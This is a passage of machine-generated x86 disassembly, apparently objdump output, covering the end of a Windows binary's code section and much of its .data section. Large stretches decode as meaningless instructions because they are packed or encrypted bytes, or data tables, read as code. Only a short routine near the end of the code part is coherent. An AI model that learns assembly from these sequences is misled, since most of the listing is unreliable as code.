  412ae0:	sbb    al,0x1c
  412ae2:	push   ecx
  412ae3:	push   0xaeb84b7
  412ae8:	mov    ebx,0x55165e5
  412aed:	jne    0x412b3b
  412aef:	pop    ebp
  412af0:	pop    es
  412af1:	ja     0x412b58
  412af3:	jbe    0x412af5
  412af5:	sbb    DWORD PTR ds:0xd9b76304,esi
  412afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412afc:	cmp    BYTE PTR [edx-0x54],dl
  412aff:	nop
  412b00:	loop   0x412b54
  412b02:	push   ds
  412b03:	ja     0x412b4c
  412b05:	xchg   ecx,eax
  412b06:	dec    ebp
  412b07:	imul   ecx,DWORD PTR [ebx],0xffffffa5
  412b0a:	add    eax,edi
  412b0c:	sti    
  412b0d:	repz data16 cmp al,0xe4
  412b11:	mov    esp,0x6d04c4e4
  412b16:	aad    0xe9
  412b18:	mov    DWORD PTR [eax+0x5f],ecx
  412b1b:	or     ecx,edx
  412b1d:	jbe    0x412b18
  412b1f:	out    0xe5,eax
  412b21:	scas   eax,DWORD PTR es:[edi]
  412b22:	or     al,0xaf
  412b24:	dec    ecx
  412b25:	push   edi
  412b26:	bnd jl 0x412aed
  412b29:	dec    edx
  412b2a:	pop    ds
  412b2b:	lock popa 
  412b2d:	inc    esi
  412b2e:	(bad)  
  412b2f:	sub    eax,0xa56bd55e
  412b34:	lahf   
  412b35:	and    BYTE PTR gs:[ebx-0x65ccdf56],bh
  412b3c:	mov    ebp,0xdb59d333
  412b41:	sbb    eax,0x8b5d3a2d
  412b46:	mov    edx,0x8cdd37e4
  412b4b:	sub    DWORD PTR [edx-0x20],ecx
  412b4e:	mov    BYTE PTR [edx+0x1f0a6398],dl
  412b54:	push   ds
  412b55:	dec    ebx
  412b56:	bound  esi,QWORD PTR [esp+ecx*1-0x7eda5713]
  412b5d:	push   edx
  412b5e:	sbb    DWORD PTR [ecx-0x23],ecx
  412b61:	lods   al,BYTE PTR ds:[esi]
  412b62:	push   ebx
  412b63:	mov    dl,0x1e
  412b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b66:	jno    0x412bcf
  412b68:	sbb    al,BYTE PTR [esp+edi*8-0x50]
  412b6c:	jmp    0x412b6d
  412b6e:	push   esi
  412b6f:	lea    edi,[edx+0x63]
  412b72:	add    BYTE PTR [ecx+0x29342b91],ah
  412b78:	sbb    eax,0x6ff70d8c
  412b7d:	push   es
  412b7e:	add    eax,0xe2a055d9
  412b83:	push   ebx
  412b84:	xchg   bl,ah
  412b86:	push   edi
  412b87:	cs dec edx
  412b89:	int3   
  412b8a:	dec    ebx
  412b8b:	cwde   
  412b8c:	push   ecx
  412b8d:	jmp    0x73a:0xea417de4
  412b94:	mov    bl,0x95
  412b96:	inc    ebp
  412b97:	dec    ebp
  412b98:	or     al,0x50
  412b9a:	sub    eax,0xf7578955
  412b9f:	pop    ds
  412ba0:	sbb    ebx,ebx
  412ba2:	scas   eax,DWORD PTR es:[edi]
  412ba3:	fisubr DWORD PTR [eax+ebx*4]
  412ba6:	mov    al,ch
  412ba8:	neg    BYTE PTR [edi]
  412baa:	jns    0x412bcf
  412bac:	sub    al,0xcd
  412bae:	aas    
  412baf:	js     0x412b57
  412bb1:	arpl   WORD PTR [esi],di
  412bb3:	push   eax
  412bb4:	jmp    0xd2c736f3
  412bb9:	xlat   BYTE PTR ds:[ebx]
  412bba:	jge    0x412b91
  412bbc:	mov    edx,DWORD PTR ds:[eax+0x12]
  412bc0:	mov    bl,0x3d
  412bc2:	das    
  412bc3:	push   esp
  412bc4:	repz adc al,0xce
  412bc7:	xchg   esp,ebp
  412bc9:	sub    al,bh
  412bcb:	dec    edx
  412bcc:	test   BYTE PTR [edi+0x17],dl
  412bcf:	loopne 0x412c11
  412bd1:	ret    
  412bd2:	lock mov al,fs:0x5500893d
  412bd9:	xchg   esp,eax
  412bda:	fisubr DWORD PTR [ebp-0x15]
  412bdd:	push   0x4
  412bdf:	pop    ebx
  412be0:	inc    ebx
  412be1:	xchg   ebx,ecx
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0xc3000000
  413429:	dec    eax
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	ret    
  41342d:	cmp    al,BYTE PTR [ebx]
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
